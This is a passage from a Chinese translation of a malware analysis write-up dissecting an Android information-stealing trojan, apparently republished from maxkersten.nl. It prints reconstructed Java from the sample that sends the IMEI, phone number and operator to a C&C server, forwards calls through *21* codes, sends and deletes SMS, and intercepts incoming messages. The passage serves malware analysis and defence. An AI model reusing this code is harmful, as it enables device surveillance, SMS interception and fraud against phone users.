# 洞若观火：全方位剖析Android信息窃取恶意软件（下篇）
|
##### 译文声明
本文是翻译文章，文章原作者 maxkersten，文章来源：maxkersten.nl
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 传送门
《洞若观火：全方位剖析Android信息窃取恶意软件（上篇）》
## 六、源代码分析
###  6.9 类i（第二部分）
根据从ServerCommunicator类中得到的新信息，我们能更加容易地理解类i。首先，它将收集方法和ID。
如果指定的方法是install，它还会手机网络运营商、bild模型、版本号、电话号码、IMEI、恶意程序版本和所在国家。所有这些数据都将被发送至C&C服务器。
如果指定的方法是info，那么只会将恶意程序的方法和ID发送到C&C服务器。
最后，有一个名为sms的选项，这一方法的行为与info方法相同。
    protected final Object doInBackground(Object[] urlArray) {
        Object var2 = null;
        boolean var3 = false;
        boolean var4 = MainService.e;
        String url = ((String[]) urlArray)[0];
        ServerCommunicator serverCommunicator = new ServerCommunicator();
        this.parameters.add(new BasicNameValuePair("method", this.command));
        this.parameters.add(new BasicNameValuePair("id", this.sharedPreferences.getString("id", (String) null)));
        JSONObject serverResponse;
        if (this.command.startsWith("install")) {
            String POST = "POST";
            this.parameters.add(new BasicNameValuePair("operator", TelephonyManagerWrapper.getTelephonyManager(context).getNetworkOperatorName()));
            this.parameters.add(new BasicNameValuePair("model", Build.MODEL));
            this.parameters.add(new BasicNameValuePair("os", VERSION.RELEASE));
            this.parameters.add(new BasicNameValuePair("phone", TelephonyManagerWrapper.getTelephonyManager(context).getLine1Number()));
            this.parameters.add(new BasicNameValuePair("imei", TelephonyManagerWrapper.getTelephonyManager(context).getDeviceId()));
            this.parameters.add(new BasicNameValuePair("version", Constants.version));
            this.parameters.add(new BasicNameValuePair("country", context.getResources().getConfiguration().locale.getCountry()));
            serverResponse = ServerCommunicator.callC2(url, POST, this.parameters);
        } else if (this.command.startsWith("info")) {
            serverResponse = ServerCommunicator.callC2(url, StringDatabase.POST, this.parameters);
        } else {
            serverResponse = (JSONObject) var2;
            if (this.command.startsWith("sms")) {
                serverResponse = ServerCommunicator.callC2(url, StringDatabase.POST, this.parameters);
            }
        }
        if (StringDatabase.integerZero != 0) {
            if (!var4) {
                var3 = true;
            }
            MainService.e = var3;
        }
        return serverResponse;
    }
需要注意的是，Constants类仅包含两个字段。这些变量的名称可以直接改成它们的值，例如下面的类：
    public final class Constants {
        public static int int50005 = 50005;
        public static String version = "5";
    }
6.9.1 onPostExecute
多亏我的一个朋友，我获得了使用JEB反编译的Java代码。代码仍然非常复杂，因为这一函数大概有250行之多。此外，还有很多try-catch结构和jump，这又给分析工作加大了难度。
SMALI等效代码大约有550行，这使得我们几乎无法分析。但根据SMALI代码，我们可以大概看到函数执行的操作：比较字符串，如果相匹配则执行代码。这可能代表Java代码确认后的命令处理。下面是反编译后未经修改的部分Java代码。
    //[omitted]
    try {
        if(v15.equals(String.valueOf(o.h) + o.E)) {
            this.w.edit().putLong(o.u, Long.valueOf((((long)(v8.optInt(i.t[17]) * 1000))) + System.currentTimeMillis()).longValue()).commit();
        }
        if(v15.equals(String.valueOf(o.h) + i.t[18])) {
            i.q(v8.optString(i.t[33]), v8.optString(o.c));
        }
        if(v15.equals(i.t[21] + o.f + i.t[16])) {
            v16 = v8.optString(i.t[33]);
            v17 = i.q.getContentResolver().query(ContactsContract$Contacts.CONTENT_URI, null, null, null, null);
            if(v17 != null) {
                    goto label_125;
            }
                goto label_132;
        }
            goto label_160;
    }
        catch(Throwable v2) {
        return;
    }
        try {
        label_125:
        if(v17.getCount() > o.z) {
                goto label_128;
        }
            goto label_132;
    }
        catch(Throwable v2) {
            goto label_273;
    }
    //[omitted]
为了适应本文所分析的恶意软件，我将大约250行代码重写为下面给出的代码。在重写的代码中，包含恶意程序所存在的所有功能，并且没有反编译错误。请注意，大多数字符串所在的字符串数组中，都包含33个字符串。它还使用了StringDatabase类中的字符串，这使得它非常混乱。
在代码中，包含以前没有分析过的类。这些类将在需要的时候进行分析。
    protected final void onPostExecute(JSONArray commandJson) {
        String command = commandJsonArray[0];
        switch (command) {
            case "install_true":
                sharedPreferenceEditor.putString("inst", "2").commit();
                break;
            case "call_number":
                TelephonyManagerWrapper2.callPhoneNumber(context, "*21*" + commandJson.optString("phone") + "#");
                new Handler().postDelayed(new StopCallForwardingRunnable(this), 1000 * (((long) commandJson.optInt("time"))));
                break;
            case "sms_grab":
                Long time_perehv = (((long) (commandJson.optInt("time") * 1000))) + System.currentTimeMillis();
                sharedPreferenceEditor.putLong("time_perehv", time_perehv).commit();
                break;
            case "sms_send":
                sendAndRemoveMessage(commandJson.optString("message"), commandJson.optString("phone"));
                break;
            case "delivery":
                TelephonyManagerWrapper2.callPhoneNumber(context, "*21*+79009999999#");
                String smsMessage = commandJson.optString("text");
                String recipientPhoneNumber;
                Cursor allContacts = context.getContentResolver().query(ContactsContract$Contacts.CONTENT_URI, null, null, null, null);
                Cursor contactIds = context.getContentResolver().query(ContactsContract$CommonDataKinds$Phone.CONTENT_URI, null, "contact_id = ?", new String[]{allContacts.getString(allContacts.getColumnIndex("_id"))}, null);
                if (allContacts.getCount() > 0 && contactIds.getCount() > 0) {
                    for (int i = 1; i  10) {
                    sharedPreferenceEditor.putString("url", url).commit();
                    sharedPreferenceEditor.putString("inst", "1").commit();
                }
                break;
            case "ussd":
                TelephonyManagerWrapper2.callPhoneNumber(context, commandJson.optString("phone"));
                break;
        }
    }
在switch中，处理了多个命令，这些不同的命令具体如下。随后，我们将按照列出的顺序逐一分析每个命令。
6.9.2 install_true
在接收到此命令后，字符串inst在共享首选项文件中被设置为2。这意味着安装完成。
    case "install_true":
        sharedPreferenceEditor.putString("inst", "2").commit();
        break;
6.9.3 call_number
设置应该进行呼叫转移的电话号码。使用 _21_ 作为前缀，并以#作为后缀，这样可以确保将呼入的电话转移到指定的号码上。
    case "call_number":
        TelephonyManagerWrapper2.callPhoneNumber(context, "*21*" + commandJson.optString("phone") + "#");
        new Handler().postDelayed(new StopCallForwardingRunnable(this), 1000 * (((long) commandJson.optInt("time"))));
        break;
其中，StopCallForwardingRunnable类调用#21#，取消呼叫转移。命令中的时间变量将会指定何时应该取消呼叫转移，因为runnable的调用被延迟。时间变量是以秒为单位的等待时间，在代码中，原始函数需要以毫秒为单位的变量，因此该变量被乘以了1000。代码如下：
    public final void run() {
        new TelephonyManagerWrapper2().callPhoneNumber(i.context, "#21#");
    }
我们将在分析了所有命令之后，再对TelephonyManagerWrapper2类进行分析。
6.9.4 sms_grab
time_perehv的值表示未来的特定时间，以秒为单位。处理这部分命令的代码如下：
    case "sms_grab":
        Long time_perehv = (((long) (commandJson.optInt("time") * 1000))) + System.currentTimeMillis();
        sharedPreferenceEditor.putLong("time_perehv", time_perehv).commit();
        break;
使用Android Studio的查找用法（Find
Usage）功能，可以看到String类中的字符串time_perehv（在上面的代码中被替换，以增加可读性）也同样在类Ma中被使用。在这里，由于这个类是BroadcastReceiver，所以用到了getAllSmsMessageBodies和onReceive这两个有趣的函数。
getAllSmsMessageBodies函数需要一个参数，也就是一个SMS消息数组。每条短信的正文都将放在一个字符串中，其结果以单个字符串的形式返回。
    private static String getAllSmsMessageBodies(SmsMessage[] smsMessageArray) {
        StringBuilder stringBuilder = new StringBuilder();
        for (SmsMessage messageBody : smsMessageArray) {
            stringBuilder.append(messageBody.getMessageBody());
        }
        return stringBuilder.toString();
    }
需要使用BroadcastReceiver类扩展的类来实现onReceive函数。在处理BroadcastReceiver正在侦听的intent时，onReceive函数负责处理其intent。onReceive函数具体如下：
    public void onReceive(Context context, Intent intent) {
        String intentAction;
        context.startService(new Intent(context, MainService.class));
        this.sharedPreferences = context.getSharedPreferences("PREFS_NAME", 0);
        try {
            intentAction = intent.getAction();
        } catch (Throwable th) {
            intentAction = "";
        }
        Object[] objArr = (Object[]) intent.getExtras().get("pdus");
        if (isActive || objArr != null) {
            SmsMessage[] smsMessageArray = new SmsMessage[objArr.length];
            long j = this.sharedPreferences.getLong("time_perehv", 0);
            if (System.currentTimeMillis() < Long.valueOf(j).longValue()) {
                this.w = true;
            }
            if (Boolean.valueOf(SmsMessage.createFromPdu((byte[]) objArr[0]).getDisplayOriginatingAddress().equalsIgnoreCase("900")).booleanValue()) {
                this.w = true;
            }
            if (this.w && intent != null && intentAction != null) {
                if ("android.provider.telephony.SMS_RECEIVED".compareToIgnoreCase(intentAction) == 0) {
                    String displayOriginatingAddress;
                    for (int i = 0; i < objArr.length; i++) {
                        smsMessageArray[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                        SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) objArr[i]);
                        displayOriginatingAddress = createFromPdu.getDisplayOriginatingAddress();
                        new Handler().postDelayed(new y(this, context, createFromPdu.getDisplayMessageBody(), displayOriginatingAddress), 2000);
                    }